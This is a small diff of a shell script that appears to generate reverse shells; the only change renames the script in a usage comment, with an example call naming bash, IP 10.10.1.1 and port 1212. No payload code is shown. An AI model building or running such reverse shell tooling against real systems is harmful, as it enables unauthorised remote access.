@@ -2,7 +2,7 @@
 
 #reverse shell para to' los gustos
 
-# ./reverGen.sh -l bash -i 10.10.1.1 -p 1212
+# ./reverse.sh -l bash -i 10.10.1.1 -p 1212
 
 #Colours
 greenColour="\e[0;32m\033[1m"
